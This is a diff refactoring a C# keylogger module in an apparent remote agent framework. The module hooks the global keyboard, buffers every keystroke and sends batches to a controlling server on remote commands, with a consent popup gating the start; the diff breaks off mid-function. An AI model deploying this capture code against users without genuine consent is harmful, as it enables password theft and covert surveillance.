@@ -1,37 +1,33 @@
-﻿
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text.Json;
 using System.Threading;
+using System.Threading.Tasks;
 using AgentSystem.Core;
-using Timer = System.Threading.Timer;
 using AgentSystem.Managers;
 
 namespace AgentSystem.Modules
 {
     public class KeyloggerModule : BaseModule
     {
-        // Trạng thái hoạt động
         private bool isLogging = false;
         private string activeCommandId = string.Empty;
         private Thread hookThread; 
-        // Thêm khóa an toàn đa luồng cho trạng thái module
         private readonly object _stateLock = new object();
 
-
-        // Quản lý Buffer & Đa luồng
         private readonly List<object> keyBuffer = new List<object>();
         private readonly object bufferLock = new object();
-        private Timer flushTimer;
+        
+        // Thay Timer cũ bằng CancellationTokenSource + PeriodicTimer
+        private CancellationTokenSource flushCts;
 
-        // --- WIN32 API CHO LOW-LEVEL HOOK ---
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private const int WM_SYSKEYDOWN = 0x0104;
 
-        private LowLevelKeyboardProc hookProc; // Phải giữ reference để GC không dọn dẹp
+        private LowLevelKeyboardProc hookProc; 
         private IntPtr hookId = IntPtr.Zero;
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
@@ -53,41 +49,40 @@ namespace AgentSystem.Modules
         private static extern short GetAsyncKeyState(int keyCode);
 
         public override string[] SupportedCommands => new[] { "keylog_start", "keylog_stop" };
+
         public KeyloggerModule(IAgentContext context, SecurityManager security, UIManager ui) 
             : base(context, security, ui)
         {
-            hookProc = HookCallback; // Khởi tạo delegate
+            hookProc = HookCallback; 
         }
 
-        public override void Execute(string action, JsonElement parameters, string commandId)
+        public override async Task ExecuteAsync(string action, JsonElement parameters, string commandId)
         {
             if (action == "keylog_start")
             {
-                StartLogging(commandId);
+                await StartLoggingAsync(commandId);
             }
             else if (action == "keylog_stop")
             {
                 StopLogging(commandId);
             }
         }
-        private void StartLogging(string commandId)
+
+        private async Task StartLoggingAsync(string commandId)
         {
-            // 1. Kiểm tra nhanh (Khóa luồng đọc)
             lock (_stateLock)
             {
                 if (isLogging) return;
             }
 
-            // 2. Xin quyền Consent (Tuyệt đối KHÔNG đặt trong lock vì hàm này chặn luồng chờ User bấm)
-            bool isApproved = ui.ShowConsentPopup("keylogger", 30000); 
+            // Gọi Popup Consent bất đồng bộ
+            bool isApproved = await ui.ShowConsentPopupAsync("keylogger", 30000); 
             if (!isApproved) 
             {
                 context.SendResponse(new { type = "keylog_denied", agent_id = context.AgentId, command_id = commandId, reason = "User declined permission" });
                 return; 
             }
 
-            // 3. Double-Check: Khóa lại và kiểm tra trạng thái thực sự sau khi được cấp quyền
-            // (Đề phòng trong lúc chờ Popup 30s, đã có lệnh start khác chạy xong)
             lock (_stateLock)
             {
                 if (isLogging) return; 
@@ -95,22 +90,21 @@ namespace AgentSystem.Modules
                 activeCommandId = commandId;
                 isLogging = true;
 
-                // Khởi tạo Hook trong một luồng STA riêng biệt có Message Loop
+                // Hook bắt buộc chạy trên Thread có Message Loop
                 hookThread = new Thread(() =>
                 {
                     hookId = SetHook(hookProc);
-                    Application.Run(); // Bắt buộc: Giữ luồng sống để bắt sự kiện phím
+                    Application.Run(); 
                 });
                 
                 hookThread.SetApartmentState(ApartmentState.STA);
-                
-                // QUAN TRỌNG: Đặt IsBackground = true để luồng này tự chết khi ứng dụng tắt
-                // Ngăn chặn lỗi "treo tiến trình ngầm" (Zombie Process) khi đóng Agent
                 hookThread.IsBackground = true; 
                 hookThread.Start();
 
                 context.SendResponse(new { type = "keylog_started", agent_id = context.AgentId, command_id = commandId });
-                flushTimer = new System.Threading.Timer(FlushBuffer, null, 3000, 3000);
+                
+                flushCts = new CancellationTokenSource();
+                _ = FlushLoopAsync(flushCts.Token);
             }
         }
 
@@ -120,22 +114,38 @@ namespace AgentSystem.Modules
             {
                 if (!isLogging) return;
                 
-                flushTimer?.Dispose();
+                // Hủy vòng lặp gửi dữ liệu
+                flushCts?.Cancel();
+                flushCts?.Dispose();
+                flushCts = null;
                 
-                // Gỡ Hook khỏi hệ điều hành
                 if (hookId != IntPtr.Zero)
                 {
                     UnhookWindowsHookEx(hookId);
                     hookId = IntPtr.Zero;
                 }
 
-                // Xóa tham chiếu luồng cũ (IsBackground = true sẽ lo phần dọn dẹp)
                 hookThread = null; 
-                
                 isLogging = false;
-                FlushBuffer(null);
+                FlushBuffer(); // Đẩy dữ liệu còn sót
                 
                 context.SendResponse(new { type = "keylog_stopped", agent_id = context.AgentId, command_id = commandId });
+            }
+        }
+
+        private async Task FlushLoopAsync(CancellationToken token)
+        {
+            using var timer = new PeriodicTimer(TimeSpan.FromMilliseconds(3000));
+            try
+            {
+                while (await timer.WaitForNextTickAsync(token))
+                {
+                    FlushBuffer();
+                }
+            }
+            catch (OperationCanceledException)
+            {
+                // Vòng lặp dừng khi tắt module
             }
         }
 
@@ -144,63 +154,49 @@ namespace AgentSystem.Modules
             using (Process curProcess = Process.GetCurrentProcess())
             {
                 var mainModule = curProcess.MainModule;
-                if (mainModule == null)
-                {
-                    return IntPtr.Zero;
-                }
-
+                if (mainModule == null) return IntPtr.Zero;
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(mainModule.ModuleName), 0);
             }
         }
 
         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            // Bắt sự kiện phím nhấn xuống
             if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
             {
                 int vkCode = Marshal.ReadInt32(lParam);
 
-                // Đọc trạng thái các phím bổ trợ (Modifier keys)
-                bool isShift = (GetAsyncKeyState(0x10) & 0x8000) != 0; // VK_SHIFT
-                bool isCtrl = (GetAsyncKeyState(0x11) & 0x8000) != 0;  // VK_CONTROL
-                bool isAlt = (GetAsyncKeyState(0x12) & 0x8000) != 0;   // VK_MENU (Alt)
+                bool isShift = (GetAsyncKeyState(0x10) & 0x8000) != 0; 
+                bool isCtrl = (GetAsyncKeyState(0x11) & 0x8000) != 0;  
+                bool isAlt = (GetAsyncKeyState(0x12) & 0x8000) != 0;   
 
-                // Cấu trúc đối tượng theo đặc tả JSON
                 var keyEvent = new
                 {
-                    key = ((ConsoleKey)vkCode).ToString(), // Chuyển VK Code sang chữ
+                    key = ((ConsoleKey)vkCode).ToString(), 
                     ctrl = isCtrl,
                     alt = isAlt,
                     shift = isShift,
                     timestamp_ms = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
                 };
 
-                // Đưa vào bộ đệm (Khóa lock để an toàn đa luồng)
                 lock (bufferLock)
                 {
                     keyBuffer.Add(keyEvent);
                 }
             }
-
-            // Trả điều khiển cho hệ điều hành, CHỚ QUÊN dòng này nếu không muốn liệt bàn phím
             return CallNextHookEx(hookId, nCode, wParam, lParam);
         }
 
-        private void FlushBuffer(object state)
+        private void FlushBuffer()
         {
             List<object> batchToSend;
 
-            // Khóa luồng chỉ để rút dữ liệu ra, giải phóng khóa thật nhanh
             lock (bufferLock)
             {
                 if (keyBuffer.Count == 0) return;
-
-                // Sao chép sang mảng mới và dọn dẹp mảng cũ
                 batchToSend = new List<object>(keyBuffer);
                 keyBuffer.Clear();
             }
 
-            // Gửi dữ liệu qua WebSocket
             context.SendResponse(new
             {
                 type = "keylog",
